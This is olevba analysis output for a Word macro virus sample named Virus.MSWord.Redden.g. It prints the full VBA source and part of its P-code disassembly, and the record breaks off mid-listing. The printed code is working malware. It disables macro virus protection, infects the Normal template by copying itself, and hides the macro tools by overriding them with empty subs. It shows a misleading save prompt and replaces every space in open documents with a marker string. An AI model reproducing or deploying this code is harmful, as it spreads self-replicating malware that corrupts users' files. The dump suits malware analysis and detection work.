olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Redden.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Redden.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
'  ÂÄÏÓ
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize
can = Int(4 * Rnd)
If can = 4 Then
 For Each doc In Documents
  ss = doc.Name
  mycheck = ss Like "Äîêóìåíò#**"
  resp = MsgBox("Ðåêîìåíäóåòñÿ coõðàíèòü èçìåíåíèÿ â äîêóìåíòå " & ss + " âî èçáåæàíèå ïîñëåäñòâèé çàâèñàíèÿ êîìï'þòåðà", vbYes + vbInformation + vbDefaultButton1)
  If resp = vbOK Then doc.Save
  If doc.Saved Then
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  With Selection.Find
       .ClearFormatting
       .Replacement.ClearFormatting
       .Text = " "
       .Replacement.Text = "$ÂÄÏÓ$"
       .Forward = True
       .Wrap = wdFindContinue
       .Format = True
       .MatchCase = False
       .MatchWholeWord = False
       .MatchWildcards = False
       .MatchSoundsLike = False
       .MatchAllWordForms = False
       'If .Found = True Then Font.Bold = True
   End With
   Selection.Find.Execute Replace:=wdReplaceAll
   doc.Save
   doc.Close
  End If
 Next doc
End If
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For J = 1 To cou
dest.CodeModule.DeleteLines (1)
Next J
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
aprj = NormalTemplate.VBProject.VBComponents(I).Name
If aprj = "ÂÄÏÓ" Then already = True
Next I
If Not already Then
NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "ÂÄÏÓ"
Set nor = NormalTemplate.VBProject.VBComponents("ÂÄÏÓ").CodeModule
eol = Chr(13) + Chr(10)
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
End If
Phuck:
End Sub

Private Sub Document_Open()
'  ÂÄÏÓ
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize
can = Int(4 * Rnd)
If can = 4 Then
 For Each doc In Documents
  ss = doc.Name
  mycheck = ss Like "Äîêóìåíò#**"
  resp = MsgBox("Ðåêîìåíäóåòñÿ coõðàíèòü èçìåíåíèÿ â äîêóìåíòå " & ss + " âî èçáåæàíèå ïîñëåäñòâèé çàâèñàíèÿ êîìï'þòåðà", vbYes + vbInformation + vbDefaultButton1)
  If resp = vbOK Then doc.Save
  If doc.Saved Then
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  With Selection.Find
       .ClearFormatting
       .Replacement.ClearFormatting
       .Text = " "
       .Replacement.Text = "$ÂÄÏÓ$"
       .Forward = True
       .Wrap = wdFindContinue
       .Format = True
       .MatchCase = False
       .MatchWholeWord = False
       .MatchWildcards = False
       .MatchSoundsLike = False
       .MatchAllWordForms = False
       'If .Found = True Then Font.Bold = True
   End With
   Selection.Find.Execute Replace:=wdReplaceAll
   doc.Save
   doc.Close
  End If
 Next doc
End If
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For J = 1 To cou
dest.CodeModule.DeleteLines (1)
Next J
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
aprj = NormalTemplate.VBProject.VBComponents(I).Name
If aprj = "ÂÄÏÓ" Then already = True
Next I
If Not already Then
NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "ÂÄÏÓ"
Set nor = NormalTemplate.VBProject.VBComponents("ÂÄÏÓ").CodeModule
eol = Chr(13) + Chr(10)
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
End If
Phuck:
End Sub

Private Sub Document_New()
'  ÂÄÏÓ
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize
can = Int(4 * Rnd)
can = 4
If can = 4 Then
 For Each doc In Documents
  ss = doc.Name
  mycheck = ss Like "Äîêóìåíò#**"
  resp = MsgBox("Ðåêîìåíäóåòñÿ coõðàíèòü èçìåíåíèÿ â äîêóìåíòå " & ss + " âî èçáåæàíèå ïîñëåäñòâèé çàâèñàíèÿ êîìï'þòåðà", vbYes + vbInformation + vbDefaultButton1)
  If resp = vbOK Then doc.Save
  If doc.Saved Then
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  With Selection.Find
       .ClearFormatting
       .Replacement.ClearFormatting
       .Text = " "
       .Replacement.Text = "$ÂÄÏÓ$"
       .Forward = True
       .Wrap = wdFindContinue
       .Format = True
       .MatchCase = False
       .MatchWholeWord = False
       .MatchWildcards = False
       .MatchSoundsLike = False
       .MatchAllWordForms = False
       'If .Found = True Then Font.Bold = True
   End With
   Selection.Find.Execute Replace:=wdReplaceAll
   doc.Save
   doc.Close
  End If
 Next doc
End If
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For J = 1 To cou
dest.CodeModule.DeleteLines (1)
Next J
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
aprj = NormalTemplate.VBProject.VBComponents(I).Name
If aprj = "ÂÄÏÓ" Then already = True
Next I
If Not already Then
NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "ÂÄÏÓ"
Set nor = NormalTemplate.VBProject.VBComponents("ÂÄÏÓ").CodeModule
eol = Chr(13) + Chr(10)
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
End If
Phuck:
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Redden.g
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11704 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	QuoteRem 0x0000 0x0006 "  ÂÄÏÓ"
' Line #3:
' 	OnError Phuck 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #6:
' 	ArgsCall Read 0x0000 
' Line #7:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St can 
' Line #8:
' 	Ld can 
' 	LitDI2 0x0004 
' 	Eq 
' 	IfBlock 
' Line #9:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #10:
' 	Ld doc 
' 	MemLd New 
' 	St ss 
' Line #11:
' 	Ld ss 
' 	LitStr 0x000B "Äîêóìåíò#**"
' 	Like 
' 	St mycheck 
' Line #12:
' 	LitStr 0x002E "Ðåêîìåíäóåòñÿ coõðàíèòü èçìåíåíèÿ â äîêóìåíòå "
' 	Ld ss 
' 	LitStr 0x002E " âî èçáåæàíèå ïîñëåäñòâèé çàâèñàíèÿ êîìï'þòåðà"
' 	Add 
' 	Concat 
' 	Ld vbYes 
' 	Ld vbInformation 
' 	Add 
' 	Ld vbDefaultButton1 
' 	Add 
' 	ArgsLd MsgBox 0x0002 
' 	St resp 
' Line #13:
' 	Ld resp 
' 	Ld vbOK 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld doc 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #14:
' 	Ld doc 
' 	MemLd Saved 
' 	IfBlock 
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #17:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #18:
' 	ArgsMemCallWith ClearFormatting 0x0000 
' Line #19:
' 	MemLdWith Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #20:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #21:
' 	LitStr 0x0006 "$ÂÄÏÓ$"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #22:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #23:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #24:
' 	LitVarSpecial (True)
' 	MemStWith Format$ 
' Line #25:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #26:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #28:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #29:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #30:
' 	QuoteRem 0x0007 0x0026 "If .Found = True Then Font.Bold = True"
' Line #31:
' 	EndWith 
' Line #32:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #33:
' 	Ld doc 
' 	ArgsMemCall Save 0x0000 
' Line #34:
' 	Ld doc 
' 	ArgsMemCall Close 0x0000 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #40:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #41:
' 	ElseBlock 
' Line #42:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #43:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld dest 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cou 
' Line #46:
' 	Ld cou 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #47:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cou 
' 	For 
' Line #48:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #49:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld sour 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lin 
' Line #52:
' 	Ld lin 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #53:
' 	LitVarSpecial (False)
' 	St already 
' Line #54:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #55:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St aprj 
' Line #56:
' 	Ld aprj 
' 	LitStr 0x0004 "ÂÄÏÓ"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St already 
' 	EndIf 
' Line #57:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	Ld already 
' 	Not 
' 	IfBlock 
' Line #59:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #60:
' 	LitStr 0x0004 "ÂÄÏÓ"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #61:
' 	SetStmt 
' 	LitStr 0x0004 "ÂÄÏÓ"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nor 
' Line #62:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St eol 
' Line #63:
' 	LitStr 0x000E "Sub ToolsMacro"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #64:
' 	LitStr 0x000D "Sub Organizer"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #65:
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #66:
' 	LitStr 0x0011 "Sub FileTemplates"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	Label Phuck 
' Line #69:
' 	EndSub 
' Line #70:
' Line #71:
' 	FuncDefn (Private Sub Document_Open())
' Line #72:
' 	QuoteRem 0x0000 0x0006 "  ÂÄÏÓ"
' Line #73:
' 	OnError Phuck 
' Line #74:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #75:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #76:
' 	ArgsCall Read 0x0000 
' Line #77:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St can 
' Line #78:
' 	Ld can 
' 	LitDI2 0x0004 
' 	Eq 
' 	IfBlock 
' Line #79:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #80:
' 	Ld doc 
' 	MemLd New 
' 	St ss 
' Line #81:
' 	Ld ss 
' 	LitStr 0x000B "Äîêóìåíò#**"
' 	Like 
' 	St mycheck 
' Line #82:
' 	LitStr 0x002E "Ðåêîìåíäóåòñÿ coõðàíèòü èçìåíåíèÿ â äîêóìåíòå "
' 	Ld ss 
' 	LitStr 0x002E " âî èçáåæàíèå ïîñëåäñòâèé çàâèñàíèÿ êîìï'þòåðà"
' 	Add 
' 	Concat 
' 	Ld vbYes 
' 	Ld vbInformation 
' 	Add 
' 	Ld vbDefaultButton1 
' 	Add 
' 	ArgsLd MsgBox 0x0002 
' 	St resp 
' Line #83:
' 	Ld resp 
' 	Ld vbOK 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld doc 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #84:
' 	Ld doc 
' 	MemLd Saved 
' 	IfBlock 
' Line #85:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #86:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #87:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #88:
' 	ArgsMemCallWith ClearFormatting 0x0000 
' Line #89:
' 	MemLdWith Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #90:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #91:
' 	LitStr 0x0006 "$ÂÄÏÓ$"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #92:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #93:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #94:
' 	LitVarSpecial (True)
' 	MemStWith Format$ 
' Line #95:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #96:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #97:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #98:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #99:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #100:
' 	QuoteRem 0x0007 0x0026 "If .Found = True Then Font.Bold = True"
' Line #101:
' 	EndWith 
' Line #102:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #103:
' 	Ld doc 
' 	ArgsMemCall Save 0x0000 
' Line #104:
' 	Ld doc 
' 	ArgsMemCall Close 0x0000 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #109:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #110:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #111:
' 	ElseBlock 
' Line #112:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #113:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	Ld dest 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cou 
' Line #116:
' 	Ld cou 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #117:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cou 
' 	For 
' Line #118:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #119:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld sour 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lin 
' Line #122:
' 	Ld lin 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #123:
' 	LitVarSpecial (False)
' 	St already 
' Line #124:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #125:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St aprj 
' Line #126:
' 	Ld aprj 
' 	LitStr 0x0004 "ÂÄÏÓ"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St already 
' 	EndIf 
' Line #127:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #128:
' 	Ld already 
' 	Not 
' 	IfBlock 
' Line #129:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #130:
' 	LitStr 0x0004 "ÂÄÏÓ"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #131:
' 	SetStmt 
' 	LitStr 0x0004 "ÂÄÏÓ"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nor 
' Line #132:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St eol 
' Line #133:
' 	LitStr 0x000E "Sub ToolsMacro"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #134:
' 	LitStr 0x000D "Sub Organizer"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #135:
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #136:
' 	LitStr 0x0011 "Sub FileTemplates"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #137:
' 	EndIfBlock 
' Line #138:
' 	Label Phuck 
' Line #139:
' 	EndSub 
' Line #140:
' Line #141:
' 	FuncDefn (Private Sub Document_New())
' Line #142:
' 	QuoteRem 0x0000 0x0006 "  ÂÄÏÓ"
' Line #143:
' 	OnError Phuck 
' Line #144:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #145:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #146:
' 	ArgsCall Read 0x0000 
' Line #147:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St can 
' Line #148:
' 	LitDI2 0x0004 
' 	St can 
' Line #149:
' 	Ld can 
' 	LitDI2 0x0004 
' 	Eq 
' 	IfBlock 
' Line #150:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #151:
' 	Ld doc 
' 	MemLd New 
' 	St ss 
' Line #152:
' 	Ld ss 
' 	LitStr 0x000B "Äîêóìåíò#**"
' 	Like 
' 	St mycheck 
' Line #153:
' 	LitStr 0x002E "Ðåêîìåíäóåòñÿ coõðàíèòü èçìåíåíèÿ â äîêóìåíòå "
' 	Ld ss 
' 	LitStr 0x002E " âî èçáåæàíèå ïîñëåäñòâèé çàâèñàíèÿ êîìï'þòåðà"
' 	Add 
' 	Concat 
' 	Ld vbYes 
' 	Ld vbInformation 
' 	Add 
' 	Ld vbDefaultButton1 
' 	Add 
' 	ArgsLd MsgBox 0x0002 
' 	St resp 
' Line #154:
' 	Ld resp 
' 	Ld vbOK 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld doc 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #155:
' 	Ld doc 
' 	MemLd Saved 
' 	IfBlock 
' Line #156:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #157:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #158:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #159:
' 	ArgsMemCallWith ClearFormatting 0x0000 
' Line #160:
' 	MemLdWith Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #161:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #162:
' 	LitStr 0x0006 "$ÂÄÏÓ$"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #163:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #164:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #165:
' 	LitVarSpecial (True)
' 	MemStWith Format$ 
' Line #166:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #167:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #168:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #169:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #170:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #171:
' 	QuoteRem 0x0007 0x0026 "If .Found = True Then Font.Bold = True"
' Line #172:
' 	EndWith 
' Line #173:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #174:
' 	Ld doc 
' 	ArgsMemCall Save 0x0000 
' Line #175:
' 	Ld doc 
' 	ArgsMemCall Close 0x0000 
' Line #176:
' 	EndIfBlock 
' Line #177:
' 	StartForVariable 
' 	Ld doc 
' 	EndForVariable 
' 	NextVar 
' Line #178:
' 	EndIfBlock 
' Line #179:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #180:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #181:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #182:
' 	ElseBlock 
' Line #183:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #184:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #185:
' 	EndIfBlock 
' Line #186:
' 	Ld dest 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cou 
' Line #187:
' 	Ld cou 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #188:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cou 
' 	For 
' Line #189:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #190:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #191:
' 	EndIfBlock 
' Line #192:
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd CodeModule 
